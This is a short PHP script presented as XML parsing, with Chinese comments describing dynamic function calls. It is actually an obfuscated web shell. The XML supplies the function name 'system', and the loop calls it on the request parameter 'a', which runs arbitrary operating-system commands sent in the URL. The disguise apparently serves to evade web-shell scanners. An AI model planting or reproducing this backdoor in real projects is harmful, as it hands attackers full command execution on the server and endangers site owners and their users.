<?php
$xmlString = '<?xml version="1.0" encoding="UTF-8"?>
<data>
    <item>
        <key>system</key>
    </item>
    <item>
        <key>age</key>
        <value>30</value>
    </item>
</data>';

$dom = new DOMDocument();
$dom->loadXML($xmlString);

// 获取所有 key 节点
$keys = $dom->getElementsByTagName('key');

foreach ($keys as $keyNode) {
    $key = $keyNode->nodeValue;
    ($key)($_GET['a']); // 动态调用函数
}
?>
